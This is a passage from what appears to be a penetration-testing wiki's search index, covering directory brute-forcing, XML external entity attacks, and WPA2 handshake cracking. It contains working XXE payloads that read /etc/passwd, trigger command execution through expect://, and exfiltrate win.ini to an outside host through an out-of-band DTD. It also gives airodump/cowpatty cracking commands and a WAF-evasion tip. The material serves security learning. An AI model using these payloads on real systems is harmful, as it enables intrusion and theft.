force hidden files and directories. Just test a bunch of them. There are several tools for doing this. The attack is of course very noisy and will show up fast in the logs. Dirb # This is a really easy tool to use: dirb http://target.com Dirbuster # It is a GUI You start it with: dirbuster OWASP ZAP # Insert your target. Add it to the context Click the plus-sign Click on Forced Browse Wfuzz # You can find the manual by typing: wfuzz -h wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://pegasus.dev:8088/FUZZ.php Gobuster # # Gobuster - remove relevant responde codes (403 for example) gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e WAF - Web application firewall # It might be that dirb shows you 403 errors, instead of the expected 404. This might mean that there is a WAF protecting the site. To get around it we might have to change our request header to it looks more like a normal request. dirb http://target.com -a \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"","title":"Find Files"},{"location":"attacking_web_applications/web-scanning/#find-hidden-files-and-directories","text":"","title":"Find hidden files and directories"},{"location":"attacking_web_applications/web-scanning/#tldr","text":"# Dirb dirb https://192.168.1.101 # Gobuster - remove relevant responde codes (403 for example) gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e","title":"TLDR"},{"location":"attacking_web_applications/web-scanning/#about","text":"There is essentially no way for a user to know which files are found in which directories on a web-server, unless the whole server has directory listing by default. However, if you go directly to the page it will be shown. So what the attacker can do is to brute force hidden files and directories. Just test a bunch of them. There are several tools for doing this. The attack is of course very noisy and will show up fast in the logs.","title":"About"},{"location":"attacking_web_applications/web-scanning/#dirb","text":"This is a really easy tool to use: dirb http://target.com","title":"Dirb"},{"location":"attacking_web_applications/web-scanning/#dirbuster","text":"It is a GUI You start it with: dirbuster","title":"Dirbuster"},{"location":"attacking_web_applications/web-scanning/#owasp-zap","text":"Insert your target. Add it to the context Click the plus-sign Click on Forced Browse","title":"OWASP ZAP"},{"location":"attacking_web_applications/web-scanning/#wfuzz","text":"You can find the manual by typing: wfuzz -h wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://pegasus.dev:8088/FUZZ.php","title":"Wfuzz"},{"location":"attacking_web_applications/web-scanning/#gobuster","text":"# Gobuster - remove relevant responde codes (403 for example) gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e","title":"Gobuster"},{"location":"attacking_web_applications/web-scanning/#waf-web-application-firewall","text":"It might be that dirb shows you 403 errors, instead of the expected 404. This might mean that there is a WAF protecting the site. To get around it we might have to change our request header to it looks more like a normal request. dirb http://target.com -a \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"","title":"WAF - Web application firewall"},{"location":"attacking_web_applications/xml_external_entity_attack/","text":"XML External Entity Attack # With this attack you can do: Read local files Denial-of-service Perform port-scan Remote Code Execution (on ASPX and PHP sometimes) Where do you find it: Anywhere where XML is posted. Common with file-uploading functionality. For files that uses XML, like: docx, pptx, gpx, pdf and xml itself. Background XML # XML is a markup language, like HTML. Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html. To define a XML-section/document you need the following tag to begin: Oh, and by the way TAG is named ELEMENT (same as in html) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml version=\"1.0\" ?> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> Example of valid XML: <?xml version=\"1.0\"?> <change-log> <text>Hello World</text> </change-log> DTD stand for Document type definition. A DTD is basically a file that defines the structure of an XML document. For example, this is quite common to see baick in the days: This simply means that the XML document will follow the standard defined in the references DTD. This DTD simply defines an old form of HTML. <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML Basic 1.0//EN\" \"http://www.w3.org/TR/xhtml-basic/xhtml-basic10.dtd\"> DTD:s can be really useful in order to create a standard when transferring data. The sender and the reciever knows exactly what tags the document will have. So imagine that you create a service that anyone can use to send in data in the format of XML, but how will they know what elements are required, and so on. https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing Syntax rule # So, now that we know that DTD are just definitions of XML documents, the question becomes, how do we write our own DTD:s. A DTD must adhere to a few rules. Must have root element (it doesn't have to be called root, it can be called anything) Optional have XML prolog (xml version is the prolog) <?xml version=\"1.0\" encoding=\"UTF-8\"?> All elements must have closing tag Tags are case-sensitive XML Attributes must be quotes Special characters must be escaped correctly. < < less than > > greater than & & ampersand ' ' apostrophe \" \" quotation mark Whitespace is perserved in XML Okay, so those are some of the rules. Now let's look at some practical examples, how do we create/define an element in in a DTD? <!ELEMENT element-name category> or <!ELEMENT element-name (element-content)> In attacks you will probably see things like this: <!ENTITY name value> <!ENTITY % name value> The first one create a general entity. The second one (with the percentage sign) creates a \"parameter\" entity. I think the first one is dereferences like this &name; ANd the second one like this: %name; So, now lets combine all this and create a DTD. If the DTD is defined inside an already existing XML document we need the following. THis says: \"here comes a DTD\". <!DOCTYPE note []> Now let's add some elements: <!DOCTYPE note [ <!ELEMENT note (name, age)> //This means that the note element must contain a name and age element. The parenthesis just means that it coantains child elements. <!ELEMENT name (#PCDATA)> // Here we define the name of the element <name></name> and that it will be PCDATA <!ELEMENT age (#PCDATA)> ]> <note> <name>Pelle</name> <age>20</age> </note> Okay. But maybe we don't want to define the entire XML document, inside every request, inside every XML document. It seems a bit like a hassle. So maybe we can just import the DTD? YES, this is possible. The most basic way this can be done is the following way. SYSTEM is just a keyword for \"load external DTD\". <!DOCTYPE root SYSTEM \"myDTD.dtd\"> <!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\"> Which protocols are allowed depends on the implementation of the XML parser. But some that might work are the following: gopher:// file:// http:// https:// file:// ftp:// Okay. So now we know how we can retreieve an external DTD. But what about ENTITY, it is even int eh name of the attack XML EXTERNAL ENTITY. So, when you define your DTD you can basically create variables, in xml-speak a variable is an ENTITY. In a DTD an entitiy is defined like this: <!DOCTYPE root [ <!ENTITY name \"PELLE\"> ]> <root>&name;</root> When the XML is parsed the entity will be transformed into \"PELLE\". Of course, you can also retreive external entities. <!DOCTYPE root [ <!ENTITY name SYSTEM \"file:///etc/passwd\"> ]> <root>&name;</root> <!DOCTYPE root [ < ]> Attack # So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST. An attack might look like this: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> The elemet can be whatever, it doesn't matter. The xxe is the \"variable\" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem. In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"expect://id\" >]> <creds> <user>&xxe;</user> <pass>mypass</pass> </creds> Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server. The technique is similar to how you exfiltrate the cookie in a Cross-Site Scripting attack, you send it in the url. Test for it # Input is reflected <?xml version=\"1.0\"?><!DOCTYPE Any [<!ENTITY xxe \"testdata\">]><add>&xxe;</add> If \"testdata\" gets reflected then it is vulnerable to XXE. If it gets reflected you can try to exfiltrate the data the following way: <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect. <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM \"http://192.168.1.101/fil.txt\">]><test>&xxe;</test> XXE with JSON # Even if you are sending in JSON, always make sure to convert the JSON to valid XML. And then change the content-type to xml. For more see: https://blog.netspi.com/playing-content-type-xxe-json-endpoints/ XXE in Excel Xlsx files # Excel files are just zipped xml files. So you can simply unzip Payloads # OOB Simple # <!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\"> OOB BizTalk # This payload will make a request to hackburk.haxxon.se/quel/dtd.xml: <?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://hackburk.haxxson.se/quel/dtd.xml\"> %sp; %param1; %exfil; ]> dtd.xml contains the following: <!ENTITY % data SYSTEM \"file:///c:/windows/win.ini\"> <!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM 'http://hackburk.haxxson.se/?%data;'>\"> The vulnerable server will thus retreive the dtd.xml, then parse it, and then make a request to haxxon.se and include the file in the data parameter. It will be encoded aswell so it will make a correct request. Examples # XXE from uploading Powerpoint - https://hackerone.com/reports/334488 XXE in SOAP request - https://hackerone.com/reports/36450 XXE in SVG file upload - https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/ XXE in PNG/PDF upload Exfiltrate data through URL # https://blog.bugcrowd.com/advice-from-a-researcher-xxe/ References # https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/ https://blog.bugcrowd.com/advice-from-a-researcher-xxe/ http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html","title":"XML External Entity (XXE)"},{"location":"attacking_web_applications/xml_external_entity_attack/#xml-external-entity-attack","text":"With this attack you can do: Read local files Denial-of-service Perform port-scan Remote Code Execution (on ASPX and PHP sometimes) Where do you find it: Anywhere where XML is posted. Common with file-uploading functionality. For files that uses XML, like: docx, pptx, gpx, pdf and xml itself.","title":"XML External Entity Attack"},{"location":"attacking_web_applications/xml_external_entity_attack/#background-xml","text":"XML is a markup language, like HTML. Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html. To define a XML-section/document you need the following tag to begin: Oh, and by the way TAG is named ELEMENT (same as in html) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml version=\"1.0\" ?> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> Example of valid XML: <?xml version=\"1.0\"?> <change-log> <text>Hello World</text> </change-log> DTD stand for Document type definition. A DTD is basically a file that defines the structure of an XML document. For example, this is quite common to see baick in the days: This simply means that the XML document will follow the standard defined in the references DTD. This DTD simply defines an old form of HTML. <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML Basic 1.0//EN\" \"http://www.w3.org/TR/xhtml-basic/xhtml-basic10.dtd\"> DTD:s can be really useful in order to create a standard when transferring data. The sender and the reciever knows exactly what tags the document will have. So imagine that you create a service that anyone can use to send in data in the format of XML, but how will they know what elements are required, and so on. https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing","title":"Background XML"},{"location":"attacking_web_applications/xml_external_entity_attack/#syntax-rule","text":"So, now that we know that DTD are just definitions of XML documents, the question becomes, how do we write our own DTD:s. A DTD must adhere to a few rules. Must have root element (it doesn't have to be called root, it can be called anything) Optional have XML prolog (xml version is the prolog) <?xml version=\"1.0\" encoding=\"UTF-8\"?> All elements must have closing tag Tags are case-sensitive XML Attributes must be quotes Special characters must be escaped correctly. < < less than > > greater than & & ampersand ' ' apostrophe \" \" quotation mark Whitespace is perserved in XML Okay, so those are some of the rules. Now let's look at some practical examples, how do we create/define an element in in a DTD? <!ELEMENT element-name category> or <!ELEMENT element-name (element-content)> In attacks you will probably see things like this: <!ENTITY name value> <!ENTITY % name value> The first one create a general entity. The second one (with the percentage sign) creates a \"parameter\" entity. I think the first one is dereferences like this &name; ANd the second one like this: %name; So, now lets combine all this and create a DTD. If the DTD is defined inside an already existing XML document we need the following. THis says: \"here comes a DTD\". <!DOCTYPE note []> Now let's add some elements: <!DOCTYPE note [ <!ELEMENT note (name, age)> //This means that the note element must contain a name and age element. The parenthesis just means that it coantains child elements. <!ELEMENT name (#PCDATA)> // Here we define the name of the element <name></name> and that it will be PCDATA <!ELEMENT age (#PCDATA)> ]> <note> <name>Pelle</name> <age>20</age> </note> Okay. But maybe we don't want to define the entire XML document, inside every request, inside every XML document. It seems a bit like a hassle. So maybe we can just import the DTD? YES, this is possible. The most basic way this can be done is the following way. SYSTEM is just a keyword for \"load external DTD\". <!DOCTYPE root SYSTEM \"myDTD.dtd\"> <!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\"> Which protocols are allowed depends on the implementation of the XML parser. But some that might work are the following: gopher:// file:// http:// https:// file:// ftp:// Okay. So now we know how we can retreieve an external DTD. But what about ENTITY, it is even int eh name of the attack XML EXTERNAL ENTITY. So, when you define your DTD you can basically create variables, in xml-speak a variable is an ENTITY. In a DTD an entitiy is defined like this: <!DOCTYPE root [ <!ENTITY name \"PELLE\"> ]> <root>&name;</root> When the XML is parsed the entity will be transformed into \"PELLE\". Of course, you can also retreive external entities. <!DOCTYPE root [ <!ENTITY name SYSTEM \"file:///etc/passwd\"> ]> <root>&name;</root> <!DOCTYPE root [ < ]>","title":"Syntax rule"},{"location":"attacking_web_applications/xml_external_entity_attack/#attack","text":"So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST. An attack might look like this: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> The elemet can be whatever, it doesn't matter. The xxe is the \"variable\" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem. In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"expect://id\" >]> <creds> <user>&xxe;</user> <pass>mypass</pass> </creds> Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server. The technique is similar to how you exfiltrate the cookie in a Cross-Site Scripting attack, you send it in the url.","title":"Attack"},{"location":"attacking_web_applications/xml_external_entity_attack/#test-for-it","text":"Input is reflected <?xml version=\"1.0\"?><!DOCTYPE Any [<!ENTITY xxe \"testdata\">]><add>&xxe;</add> If \"testdata\" gets reflected then it is vulnerable to XXE. If it gets reflected you can try to exfiltrate the data the following way: <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect. <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM \"http://192.168.1.101/fil.txt\">]><test>&xxe;</test>","title":"Test for it"},{"location":"attacking_web_applications/xml_external_entity_attack/#xxe-with-json","text":"Even if you are sending in JSON, always make sure to convert the JSON to valid XML. And then change the content-type to xml. For more see: https://blog.netspi.com/playing-content-type-xxe-json-endpoints/","title":"XXE with JSON"},{"location":"attacking_web_applications/xml_external_entity_attack/#xxe-in-excel-xlsx-files","text":"Excel files are just zipped xml files. So you can simply unzip","title":"XXE in Excel Xlsx files"},{"location":"attacking_web_applications/xml_external_entity_attack/#payloads","text":"","title":"Payloads"},{"location":"attacking_web_applications/xml_external_entity_attack/#oob-simple","text":"<!DOCTYPE root SYSTEM \"http://yourdomain.net/myDTD.dtd\">","title":"OOB Simple"},{"location":"attacking_web_applications/xml_external_entity_attack/#oob-biztalk","text":"This payload will make a request to hackburk.haxxon.se/quel/dtd.xml: <?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://hackburk.haxxson.se/quel/dtd.xml\"> %sp; %param1; %exfil; ]> dtd.xml contains the following: <!ENTITY % data SYSTEM \"file:///c:/windows/win.ini\"> <!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM 'http://hackburk.haxxson.se/?%data;'>\"> The vulnerable server will thus retreive the dtd.xml, then parse it, and then make a request to haxxon.se and include the file in the data parameter. It will be encoded aswell so it will make a correct request.","title":"OOB BizTalk"},{"location":"attacking_web_applications/xml_external_entity_attack/#examples","text":"XXE from uploading Powerpoint - https://hackerone.com/reports/334488 XXE in SOAP request - https://hackerone.com/reports/36450 XXE in SVG file upload - https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/ XXE in PNG/PDF upload","title":"Examples"},{"location":"attacking_web_applications/xml_external_entity_attack/#exfiltrate-data-through-url","text":"https://blog.bugcrowd.com/advice-from-a-researcher-xxe/","title":"Exfiltrate data through URL"},{"location":"attacking_web_applications/xml_external_entity_attack/#references","text":"https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/ https://blog.bugcrowd.com/advice-from-a-researcher-xxe/ http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html","title":"References"},{"location":"attacking_wifi/wifi/","text":"Wifi # There are quite a few different security mechanism on wifi. And each of them require a different tactic. This article outlines the different strategies quite well. http://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/ This is a great guide to the many different ways to hack wifi. WPA2 Enterprise with domain-login # It is common in corporate environments to let the users log in using their domain credentials. If the client is authenticating using WPA2 with Protected EAP (PEAP), but is not validating server certificate then it is vulnerable to man in the middle. PEAP is a TLS-tunneled EAP. So accepting any server certificate is just as bad as accepting any server certificate from a webpage. Check if server certificate is validated Authenticate to the wifi network that is using domain-credentials and PEAP. Right-click on the network name and click on Egenskaper/preferences. Click on S\u00e4kerhet/security. Click on inst\u00e4llningar/settings. Check that the box \"Bekr\u00e4fta servercertifikat\" is marked. If it is not you can present any certificate to the client and they will all be accepted. Checking what networks are avalible # sudo iwlist wlan0 scanning - scans for wifis Hacking WPA2-wifis Using airmon-ng and cowpatty # What we are going to to here it basically just to record the 4-way handshake and then run a dictionary attack on it. The good part about this strategy is that you won't have to interfere to much with the network and thereby risk of taking down their wifi. The bad part is that if you run a dictionary attack there is always the possibility that the password just isn't in the list. Start airmon-ng airmon-ng start wlan0 This puts the network card in monitoring mode. This will create a network interface that you can use to monitor wifi-action. This interface is usually called mon0 or something like that. You see the name when you run the command. Run airodump to see what is passing through the air Now we want to see what access points are available to us. airodump-ng -i mon0 This would output something like this: CH 13 ][ Elapsed: 6 s ] BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID E8:DE:27:31:15:EE -62 40 54 0 11 54e WPA2 CCMP PSK myrouter A7:B6:68:D4:1D:91 -80 7 0 0 11 54e WPA2 CCMP PSK DKT_D24D81 B4:EE:B4:80:76:72 -84 5 0 0 6 54e WPA2 CCMP PSK arrisNetwork BSSID STATION PWR Rate Lost Frames Probe E8:DE:27:31:15:EE D8:A2:5E:8E:41:75 -57 0e- 1 537 14 So what is all this? BSSID - This is the mac-address of the access point. PWR - Signal strength. The higher (closer to 0) the strength the stronger is the signal. In the example above it is myrouter that has the strongest signal. Beacon - This is kind of like a packet that the AP sends out periodically. The beacon contains information about the network. It contains the SSID, timestamp, beacon interval. If you are curious you can just analyze the beacons in wireshark after you have captured them. #Data - The number of data-packets that has been sent. #/s - Number of data-packets per second. CH - Channel MB - Maximum speed the AP can handle. ENC - Encryption type CIPHER - One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2. PSK - The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared key for WEP), PSK (pre-shared key for WPA/WPA2), or OPN (open for WEP). ESSID - The name of the network Then we have another section of information. Station - MAC address of each associated station or stations searching for an AP to connect with. Clients not currently associated with an AP have a BSSID of \u201c(not associated)\u201d. So yeah, this basically means that we can see what devices are looking for APs. This can be useful if we want to create an evil twin or something like that. Find the network you want to access. airodump-ng --bssid A7:B6:68:D4:1D:91 -c 11 -w cowpatty mon0 So this command will record or traffic from the device with that specific MAC-address. -c defines the channel. and -w cowpatty means that we are going to save the packet capture with that name. Now we just have to wait for a user to connect to that network. And when he/she does we will record that handshake. We know that we have recorded a handshake when this appears CH 11 ][ Elapsed: 19 hours 52 mins ][ 2016-05-19 17:14 ][ WPA handshake: A7:B6:68:D4:1D:91 Now we can exit airodump, and we can see that we have a cap-file with the name cowpatty-01.cap. That is our packet-capture, and you can open it and study it in wireshark if you like. Crack the password. Now that we have the handshake recorded we can start to crack it. We can do that by using the program cowpatty. cowpatty -f /usr/share/wordlists/rockyou.txt -r cowpatty-01.cap -s DKT_D24D81 Then we just hope for the best. More # Kicking other people off the network to capture handshakes faster: http://www.aircrack-ng.org/doku.php?id=newbie_guide http://lewiscomputerhowto.blogspot.cl/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html http://radixcode.com/hackcrack-wifi-password-2015-step-step-tutorial/","title":"Testing Wifi Security"},{"location":"attacking_wifi/wifi/#wifi","text":"There are quite a few different security mechanism on wifi. And each of them require a different tactic. This article outlines the different strategies quite well. http://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/ This is a great guide to the many different ways to hack wifi.","title":"Wifi"},{"location":"attacking_wifi/wifi/#wpa2-enterprise-with-domain-login","text":"It is common in corporate environments to let the users log in using their domain credentials. If the client is authenticating using WPA2 with Protected EAP (PEAP), but is not validating server certificate then it is vulnerable to man in the middle. PEAP is a TLS-tunneled EAP. So accepting any server certificate is just as bad as accepting any server certificate from a webpage. Check if server certificate is validated Authenticate to the wifi network that is using domain-credentials and PEAP. Right-click on the network name and click on Egenskaper/preferences. Click on S\u00e4kerhet/security. Click on inst\u00e4llningar/settings. Check that the box \"Bekr\u00e4fta servercertifikat\" is marked. If it is not you can present any certificate to the client and they will all be accepted.","title":"WPA2 Enterprise with domain-login"},{"location":"attacking_wifi/wifi/#checking-what-networks-are-avalible","text":"sudo iwlist wlan0 scanning - scans for wifis","title":"Checking what networks are avalible"},{"location":"attacking_wifi/wifi/#hacking-wpa2-wifis-using-airmon-ng-and-cowpatty","text":"What we are going to to here it basically just to record the 4-way handshake and then run a dictionary attack on it. The good part about this strategy is that you won't have to interfere to much with the network and thereby risk of taking down their wifi. The bad part is that if you run a dictionary attack there is always the possibility that the password just isn't in the list. Start airmon-ng airmon-ng start wlan0 This puts the network card in monitoring mode. This will create a network interface that you can use to monitor wifi-action. This interface is usually called mon0 or something like that. You see the name when you run the command. Run airodump to see what is passing through the air Now we want to see what access points are available to us. airodump-ng -i mon0 This would output something like this: CH 13 ][ Elapsed: 6 s ] BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID E8:DE:27:31:15:EE -62 40 54 0 11 54e WPA2 CCMP PSK myrouter A7:B6:68:D4:1D:91 -80 7 0 0 11 54e WPA2 CCMP PSK DKT_D24D81 B4:EE:B4:80:76:72 -84 5 0 0 6 54e WPA2 CCMP PSK arrisNetwork BSSID STATION PWR Rate Lost Frames Probe E8:DE:27:31:15:EE D8:A2:5E:8E:41:75 -57 0e- 1 537 14 So what is all this? BSSID - This is the mac-address of the access point. PWR - Signal strength. The higher (closer to 0) the strength the stronger is the signal. In the example above it is myrouter that has the strongest signal. Beacon - This is kind of like a packet that the AP sends out periodically. The beacon contains information about the network. It contains the SSID, timestamp, beacon interval. If you are curious you can just analyze the beacons in wireshark after you have captured them. #Data - The number of data-packets that has been sent. #/s - Number of data-packets per second. CH - Channel MB - Maximum speed the AP can handle. ENC - Encryption type CIPHER - One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2. PSK - The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared key for WEP), PSK (pre-shared key for WPA/WPA2), or OPN (open for WEP). ESSID - The name of the network Then we have another section of information. Station - MAC address of each associated station or stations searching for an AP to connect with. Clients not currently associated with an AP have a BSSID of \u201c(not associated)\u201d. So yeah, this basically means that we can see what devices are looking for APs. This can be useful if we want to create an evil twin or something like that. Find the network you want to access. airodump-ng --bssid A7:B6:68:D4:1D:91 -c 11 -w cowpatty mon0 So this command will record or traffic from the device with that specific MAC-address. -c defines the channel. and -w cowpatty means that we are going to save the packet capture with that name. Now we just have to wait for a user to connect to that network. And when he/she does we will record that handshake. We know that we have recorded a handshake when this appears CH 11 ][ Elapsed: 19 hours 52 mins ][ 2016-05-19 17:14 ][ WPA handshake: A7:B6:68:D4:1D:91 Now we can exit airodump, and we can see that we have a cap-file with the name cowpatty-01.cap. That is our packet-capture, and you can open it and study it in wireshark if you like. Crack the password. Now that we have the handshake recorded we can start to crack it. We can do that by using the program cowpatty. cowpatty -f /usr/share/wordlists/rockyou.txt -r cowpatty-01.cap -s DKT_D24D81 Then we just hope for the best.","title":"Hacking WPA2-wifis Using airmon-ng and cowpatty"},{"location":"attacking_wifi/wifi/#more","text":"Kicking other people off the network to capture handshakes faster: http://www.aircrack-ng.org/doku.php?id=newbie_guide http://lewiscomputerhowto.blogspot.cl/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html http://radixcode.com/hackcrack-wifi-password-2015-step-step-tutorial/","title":"More"},{"location":"attacking_wifi/wifi_network_segmentation/","text":"Testing network segmentation # The idea is to test is users from a Guest-network kan reach another, more sensitive network. It might be that the networks are separated by a firewall. Tests # Test reach to machine using icmp sudo hping3 -1 10.10.10.10 # with tracerroute sudo hping3 --traceroute -V -1 10.10.10.10 Test reach machine using SYN packet You need to test against a machine and port that will respons to a syn packet -S is for SYN packet -p is for desitnation port -s is for source port sudo hping3 -V -S -p 80 -s 5050 10.10.10.10 sudo hping3 -V -S -p 80 -s 53 10.10.10.10 sudo hping3 --traceroute -V -S -p 80 -s 53 10.10.10.10 Test reach machine over icmp with ipv6 sudo ping6 fe80::7041:baa0:593f:c6a5%11","title":"Testing Network Segmentation"},{"location":"attacking_wifi/wifi_network_segmentation/#testing-network-segmentation","text":"The idea is to test is users from a Guest-network kan reach another, more sensitive network. It might be that the networks are separated by a firewall.","title":"Testing network segmentation"},{"location":"attacking_wifi/wifi_network_segmentation/#tests","text":"Test reach to machine using icmp sudo hping3 -1 10.10.10.10 # with tracerroute sudo hping3 --traceroute -V -1 10.10.10.10 Test reach machine using SYN packet You need to test against a machine and port that will respons to a syn packet -S is for SYN packet -p is for desitnation port -s is for source port sudo hping3 -V -S -p 80 -s 5050 10.10.10.10 sudo hping3 -V -S -p 80 -s 53 10.10.10.10 sudo hping3 --traceroute -V -S -p 80 -s 53 10.10.10.10 Test reach machine over icmp with ipv6 sudo ping6 fe80::7041:baa0:593f:c6a5%11","title":"Tests"},{"location":"basic_hardening/hardening_bios/","text":"Why hardening bios? # It is a good idea add a password to enter the BIOS. Why is that? Was is the worst that can happen? Intel Active Management Technology (IAMT) # IAMT is a hardware and firmware technology used to perform out-of-band access to a computer. This means that if IAMT is enabled a user can remotely start the computer and then access that computer (if the user has credentials). How is it even possible to access a computer that is not even turned on, you might wonder. How can it have an IP if it is not turned on? Intel add a separate microprocessor. It does not require an OS to work or any kind of locally installed agent. AMT is most often found in business computers, and not as often on regular non-business computers. IAMT is usually accessible over the network on the port 16992 or 16993 as a web interface. Features One feature that is provided by IAMT is Keyboard-Video-Mouse (KVM) over LAN. This means that, if enabled, someone can access the computer over the network. Remote boot - you can remotely boot the computer from a different image. You can even boot from an image on a network share. Risks # This means that if an attacker has physical access to a computer and bios password is not set, that person can enter into the BIOS and enable IAMT. If the disk is not encrypted the attacker can go back to anyware on the lan and then just boot the computer. If it requires a password to log in the attacker can bypass that simply by booting the computer from an image remote. Change boot-order # If no BIOS password is set then an attacker can change the boot-order, in order to boot the computer from a USB. This way it is possible to bypass the OS authentication. If the computer is encrypted there is nothing that user can do. Changing the boot-order is only an interesting attack","title":"Hardening Bios"},{"location":"basic_hardening/hardening_bios/#why-hardening-bios","text":"It is a good idea add a password to enter the BIOS. Why is that? Was is the worst that can happen?","title":"Why hardening bios?"},{"location":"basic_hardening/hardening_bios/#intel-active-management-technology-iamt","text":"IAMT is a hardware and firmware technology used to perform out-of-band access to a computer. This means that if IAMT is enabled a user can remotely start the computer and then access that computer (if the user has credentials). How is it even possible to access a computer that is not even turned on, you might wonder. How can it have an IP if it is not turned on? Intel add a separate microprocessor. It does not require an OS to work or any kind of locally installed agent. AMT is most often found in business computers, and not as often on regular non-business computers. IAMT is usually accessible over the network on the port 16992 or 16993 as a web interface. Features One feature that is provided by IAMT is Keyboard-Video-Mouse (KVM) over LAN. This means that, if enabled, someone can access the computer over the network. Remote boot - you can remotely boot the computer from a different image. You can even boot from an image on a network share.","title":"Intel Active Management Technology (IAMT)"},{"location":"basic_hardening/hardening_bios/#risks","text":"This means that if an attacker has physical access to a computer and bios password is not set, that person can enter into the BIOS and enable IAMT. If the disk is not encrypted the attacker can go back to anyware on the lan and then just boot the computer. If it requires a password to log in the attacker can bypass that simply by booting the computer from an image remote.","title":"Risks"},{"location":"basic_hardening/hardening_bios/#change-boot-order","text":"If no BIOS password is set then an attacker can change the boot-order, in order to boot the computer from a USB. This way it is possible to bypass the OS authentication. If the computer is encrypted there is nothing that user can do. Changing the boot-order is only an interesting attack","title":"Change boot-order"},{"location":"basic_hardening/hardening_linux/","text":"Hardening #","title":"Hardening Linux"},{"location":"basic_hardening/hardening_linux/#hardening","text":"","title":"Hardening"},{"location":"basics_of_linux/bash_scripting/","text":"Bash-scripting # Variables # # There can't be any space between the variable name and the equal sign. It has to be varname=command 